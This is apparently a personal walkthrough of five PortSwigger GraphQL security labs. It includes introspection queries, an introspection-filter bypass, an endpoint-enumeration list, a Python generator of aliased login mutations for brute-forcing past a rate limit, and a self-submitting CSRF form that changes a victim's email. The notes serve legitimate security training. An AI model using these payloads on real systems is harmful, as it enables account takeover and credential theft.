---
created: 2026-05-25
---
| `#`  | Solved? | Name                                          | Date    |
| ---- | ------- | --------------------------------------------- | ------- |
| `1.` | `✓`     | Accessing private GraphQL posts               | `25.05` |
| `2.` | `✓`     | Accidental exposure of private GraphQL fields | `25.05` |
| `3.` | `✓`     | Finding a hidden GraphQL endpoint             | `25.05` |
| `4.` | `✓`     | Bypassing GraphQL brute force protections     | `25.05` |
| `5.` | `✓`     | Performing CSRF exploits over GraphQL         | `26.05` |

## 1. Accessing private GraphQL posts

>[!done]

>[!note]+ Lab description
> - [`Lab: Accessing private GraphQL posts`](https://portswigger.net/web-security/graphql/lab-graphql-reading-private-posts)
> - Level: #Apprentice 
> 
> The blog page for this lab contains a hidden blog post that has a secret password. To solve the lab, find the hidden blog post and enter the password.
> 
> Learn more about [Working with GraphQL in Burp Suite](https://portswigger.net/burp/documentation/desktop/testing-workflow/working-with-graphql).
### Solution

- Access the application and record the traffic using Burp Suite. 
- In HTTP history, find a request to `/graphql/v1` — this is the target GraphQL endpoint:

![[images/walkthrough/PortSwigger/GraphQL/lab1/1.png]]

- Inspect the query and the response in the `GraphQL` tab:

![[images/walkthrough/PortSwigger/GraphQL/lab1/2.png]]

- Send an introspection query and see introspection is enabled:

![[images/walkthrough/PortSwigger/GraphQL/lab1/3.png]]

- To visualize the schema, you can use [`GraphQL Voyager`](https://apis.guru/graphql-voyager/):

![[images/walkthrough/PortSwigger/GraphQL/lab1/4.png]]

- Notice the post with id `3` is missing. Use `getBlogPost` query you got from the schema to query the missing post, and add `postPassword` to retrieve the password:

```JSON
query getBlogSummaries {
    getBlogPost(id: 3) {
        image
        title
        summary
        id
        postPassword
    }
}
```


![[images/walkthrough/PortSwigger/GraphQL/lab1/5.png]]

- Copy the password and submit it as a solution.

![[images/walkthrough/PortSwigger/GraphQL/lab1/solved.png]]

Solved!
## 2. Accidental exposure of private GraphQL fields

>[!done]

>[!note]+ Lab description
> - [`Lab: Accidental exposure of private GraphQL fields`](https://portswigger.net/web-security/graphql/lab-graphql-accidental-field-exposure)
> - Level: #Practitioner 
> 
> The user management functions for this lab are powered by a GraphQL endpoint. The lab contains an access control vulnerability whereby you can induce the API to reveal user credential fields.
> 
> To solve the lab, sign in as the administrator and delete the username `carlos`.
> 
> Learn more about [Working with GraphQL in Burp Suite](https://portswigger.net/burp/documentation/desktop/testing-workflow/working-with-graphql).

### Solution


- Access the application and record the traffic using Burp Suite. 
- In HTTP history, find a request to `/graphql/v1` — this is the target GraphQL endpoint:

![[images/walkthrough/PortSwigger/GraphQL/lab2/1.png]]

- Send the request to `Repeater` and set the introspection query.
- Observe introspection is enabled:

![[images/walkthrough/PortSwigger/GraphQL/lab2/2.png]]

- Copy the schema and paste it into GraphQL Voyager or another visualizer:

![[images/walkthrough/PortSwigger/GraphQL/lab2/3.png]]

- Use the `getUser` query to query a user with ID `1`:

```JSON
query getBlogSummaries {
    getUser(id: 1) {
        id
        username
        password
    }
}
```

- In response, find credentials for the admin user:

```JSON
{
  "data": {
    "getUser": {
      "id": 1,
      "username": "administrator",
      "password": "22dpstg3f61j0if1vksw"
    }
  }
}
```

![[images/walkthrough/PortSwigger/GraphQL/lab2/4.png]]

- Log in, access the administrator panel, and delete the user `carlos`.

![[images/walkthrough/PortSwigger/GraphQL/lab2/solved.png]]

Solved!
## 3. Finding a hidden GraphQL endpoint

>[!done]

>[!note]+ Lab description
> - [`Lab: Finding a hidden GraphQL endpoint`](https://portswigger.net/web-security/graphql/lab-graphql-find-the-endpoint)
> - Level: #Practitioner 
> 
> The user management functions for this lab are powered by a hidden GraphQL endpoint. You won't be able to find this endpoint by simply clicking pages in the site. The endpoint also has some defenses against introspection.
> 
> To solve the lab, find the hidden endpoint and delete `carlos`.
> 
> Learn more about [Working with GraphQL in Burp Suite](https://portswigger.net/burp/documentation/desktop/testing-workflow/working-with-graphql).

### Solution

- Access the lab and browse the application. In HTTP history, no GraphQL API requests are recorded.
- Construct a `POST` request with a GraphQL universal query:

```JSON
query{__typename}
```

- Send it to the `/graphql` endpoint and see the application responds with `404 Not Found`:

![[images/walkthrough/PortSwigger/GraphQL/lab3/1.png]]


- This endpoint doesn't exist.
- To enumerate possible endpoints, send this request to `Intruder`, mark the URL with payload placeholder, and paste the following as a payload list: 

```
/graphql
/api
/api/graphql
/graphql/api
/graphql/graphql
/v1/graphql
/api/v1/graphql
/gql
/query
/graphiql
/playground
/explorer
```

- Importantly, turn off automatic URL encoding of special characters in the payload panel (so the forward slash in the path is not encoded).

![[images/walkthrough/PortSwigger/GraphQL/lab3/2.png]]

- `Start attack`. Sort responses by status code or length; the `/api` endpoint responds wity `405 Method Not Allowed` when all other respond with `404 Not Found`:

![[images/walkthrough/PortSwigger/GraphQL/lab3/3.png]]


- In `Repeater`, change URL path to `/api` and `Change request method`:

![[images/walkthrough/PortSwigger/GraphQL/lab3/4.png]]

- The application responds with `Query not present`.

- Change the URL path to:

```
/api?query=query{__typename}
```

- See the application response with:

```JSON
{
  "data": {
    "__typename": "query"
  }
}
```

- This signifies a GraphQL endpoint. 

![[images/walkthrough/PortSwigger/GraphQL/lab3/5.png]]

- Send an introspection probe via `GET`:

```powershell
/api?query=query%7B__schema%0A%7BqueryType%7Bname%7D%7D%7D
```

![[images/walkthrough/PortSwigger/GraphQL/lab3/6.png]]

- Right-click on the request -> `Set introspection query`:


![[images/walkthrough/PortSwigger/GraphQL/lab3/7.png]]

![[images/walkthrough/PortSwigger/GraphQL/lab3/8.png]]

- The application responds with:

```JSON

{
  "errors": [
    {
      "locations": [],
      "message": "GraphQL introspection is not allowed, but the query contained __schema or __type"
    }
  ]
}
```

- To bypass that, add a newline after `__schema`:

![[images/walkthrough/PortSwigger/GraphQL/lab3/9.png]]

![[images/walkthrough/PortSwigger/GraphQL/lab3/10.png]]

- The application responds with a schema. Paste it to Voyager:

![[images/walkthrough/PortSwigger/GraphQL/lab3/11.png]]

- Send `getUsre` queries incrementing the `id` variable until you find `carlos`:
- Query a user with ID `1`:

```yaml
query getUser {
     getUser(id: 1) {
        id
        username
    }
}
```

![[12.png]]

- Since the query doesn't return user passwords, you can't simply log in as `administrator` and delete `carlos`, as worked in previous labs. 
- To delete the user, you need to find a suitable GraphQL mutation in the schema.
- Inspect the schema again and find the `deleteOrganizationUser` mutation:

![[13.png]]

- Construct a mutation:

```
mutation {
  deleteOrganizationUser(input: { id: 3 }) {
    __typename
  }
}
```

- Response:

```bash
{
  "data": {
    "deleteOrganizationUser": {
      "__typename": "DeleteOrganizationUserResponse"
    }
  }
}
```

![[images/walkthrough/PortSwigger/GraphQL/lab3/solved.png]]

Solved!

## 4. Bypassing GraphQL brute force protections

>[!done]

>[!note]+ Lab description
> - [`Lab: Bypassing GraphQL brute force protections`](https://portswigger.net/web-security/graphql/lab-graphql-brute-force-protection-bypass)
> - Level: #Practitioner 
> 
> The user login mechanism for this lab is powered by a GraphQL API. The API endpoint has a rate limiter that returns an error if it receives too many requests from the same origin in a short space of time.
> 
> To solve the lab, brute force the login mechanism to sign in as `carlos`. Use the list of [authentication lab passwords](https://portswigger.net/web-security/authentication/auth-lab-passwords) as your password source.
> 
> Learn more about [Working with GraphQL in Burp Suite](https://portswigger.net/burp/documentation/desktop/testing-workflow/working-with-graphql).

### Solution

- Access the application and attempt to log in with an arbitrary password. Record the traffic with Burp.
- Observe the application uses GraphQL API at `/graphql/v1` endpoint for login:

![[images/walkthrough/PortSwigger/GraphQL/lab4/1.png]]

- Send this request to `Repeater`.
- Observe that repeating the invalid login request several time triggers a 1-minute rate limit:

![[images/walkthrough/PortSwigger/GraphQL/lab4/2.png]]

- The query looks like this:

```yaml
mutation login($input: LoginInput!) {
	login(input: $input) {
		token
		success
	}
}
```

- Variables:

```json
{"input":{"username":"carlos","password":"any"}}
```

- If passing variable inline, with multiple login attempts at the same time (using aliases), the query would look like this:

```json
mutation login {
  attempt1: login(input: { username: "test1", password: "test1" }) {
    success
  }
  attempt2: login(input: { username: "test1", password: "test1" }) {
    success
  }
  attempt3: login(input: { username: "test1", password: "test1" }) {
    success
  }
}
```

- Response:

```json
{
  "data": {
    "attempt1": {
      "success": false
    },
    "attempt2": {
      "success": false
    },
    "attempt3": {
      "success": false
    }
  }
}
```

- Copy the candidate password list into a file (`passwords.txt`).

>[!note]- Passwords
> 
> ```
> 123456
> password
> 12345678
> qwerty
> 123456789
> 12345
> 1234
> 111111
> 1234567
> dragon
> 123123
> baseball
> abc123
> football
> monkey
> letmein
> shadow
> master
> 666666
> qwertyuiop
> 123321
> mustang
> 1234567890
> michael
> 654321
> superman
> 1qaz2wsx
> 7777777
> 121212
> 000000
> qazwsx
> 123qwe
> killer
> trustno1
> jordan
> jennifer
> zxcvbnm
> asdfgh
> hunter
> buster
> soccer
> harley
> batman
> andrew
> tigger
> sunshine
> iloveyou
> 2000
> charlie
> robert
> thomas
> hockey
> ranger
> daniel
> starwars
> klaster
> 112233
> george
> computer
> michelle
> jessica
> pepper
> 1111
> zxcvbn
> 555555
> 11111111
> 131313
> freedom
> 777777
> pass
> maggie
> 159753
> aaaaaa
> ginger
> princess
> joshua
> cheese
> amanda
> summer
> love
> ashley
> nicole
> chelsea
> biteme
> matthew
> access
> yankees
> 987654321
> dallas
> austin
> thunder
> taylor
> matrix
> mobilemail
> mom
> monitor
> monitoring
> montana
> moon
> moscow
> ```
> 

- To generate the query automatically:

```Python
print("mutation login {")

with open("passwords.txt", "r", encoding="utf-8") as file:
    for line in file:
        password = line.strip()

        print(f'''
attempt_{password}: login(input: {{ username: "carlos", password: "{password}" }}) {{
    success
}},
''')

print("}")
```

- Result:

```json
mutation login {

attempt_123456: login(input: { username: "carlos", password: "123456" }) {
    success
},


attempt_password: login(input: { username: "carlos", password: "password" }) {
    success
},


attempt_12345678: login(input: { username: "carlos", password: "12345678" }) {
    success
},
# ...
}
```

- Copy the output, paste it in the `GraphQL` section in `Repeater`, and send the query:

![[images/walkthrough/PortSwigger/GraphQL/lab4/3.png]]

- In the response, find `true`, and copy the password (after `attempt_`).
- Log in as `carlos`.

![[images/walkthrough/PortSwigger/GraphQL/lab4/solved.png]]

Solved!
## 5. Performing CSRF exploits over GraphQL

>[!done]

>[!note]+ Lab description
> - [`Lab: Performing CSRF exploits over GraphQL`](https://portswigger.net/web-security/graphql/lab-graphql-csrf-via-graphql-api)
> - Level: #Practitioner 
> 
> The user management functions for this lab are powered by a GraphQL endpoint. The endpoint accepts requests with a content-type of `x-www-form-urlencoded` and is therefore vulnerable to cross-site request forgery (CSRF) attacks.
> 
> To solve the lab, craft some HTML that uses a CSRF attack to change the viewer's email address, then upload it to your exploit server.
> 
> You can log in to your own account using the following credentials: `wiener:peter`.
> 
> Learn more about [Working with GraphQL in Burp Suite](https://portswigger.net/burp/documentation/desktop/testing-workflow/working-with-graphql).

### Solution

- Log in as `wiener` and change your email. Record the request using Burp and observe the action is performed using GraphQL:

![[images/walkthrough/PortSwigger/GraphQL/lab5/1.png]]

- Send the request to `Repeater`. Then change the query so variables are included inline:

```JSON
mutation changeEmail {
	changeEmail(input: { email: "email@example.com" }) {
		email
	}
}
```

- URL-encode:

```
mutation%20changeEmail%20%7B%0A%09changeEmail(input:%20%7B%20email:%20%22email@example.com%22%20%7D)%20%7B%0A%09%09email%0A%09%7D%0A%7D
```

- Right-click the request -> `Change request method`, then insert the `query` parameter:

```
?query=mutation%20changeEmail%20%7B%0A%09changeEmail(input:%20%7B%20email:%20%22email@example.com%22%20%7D)%20%7B%0A%09%09email%0A%09%7D%0A%7D
```

- The application responds with `405 Method Not Allowed`:

![[images/walkthrough/PortSwigger/GraphQL/lab5/2.png]]


- Send the changing email request to `Repeater` again. This time, attempt to send the data using a non-`application/json` request. Right-click on the request -> `Change body encoding` -> `Form URL-encoded`.

```json
mutation changeEmail {
	changeEmail(input: { email: "email@example.com" }) {
		email
	}
}
```


![[images/walkthrough/PortSwigger/GraphQL/lab5/3.png]]


- See the application responds with `200 OK`, which means a non-`application/json` encoding is accepted. No CSRF tokens are required.
- Construct an exploit:

```html
<html>
	<body>
		<form action="https://0a0a006d04c3e59c80db309a00f700fc.web-security-academy.net/graphql/v1" method="POST">
		
		    <input type="hidden" name="query" value='mutation changeEmail {
		    changeEmail(input: { email: "pwned@example.com" }) {
		        email
		    }
		}'>
		
		    <input type="hidden" name="operationName" value="changeEmail">
		</form>
		
		<script>
            document.forms[0].submit();
        </script>

	</body>
</html>
```

![[images/walkthrough/PortSwigger/GraphQL/lab5/4.png]]

- Then `Store` and `View exploit`. See the application returns data and no errors:
![[images/walkthrough/PortSwigger/GraphQL/lab5/5.png]]

- Go to your your account and see your email has changed:

![[images/walkthrough/PortSwigger/GraphQL/lab5/6.png]]

- Change the email in the exploit, `Store` and `Deliver exploit to victim`.

![[images/walkthrough/PortSwigger/GraphQL/lab5/solved.png]]

Solved!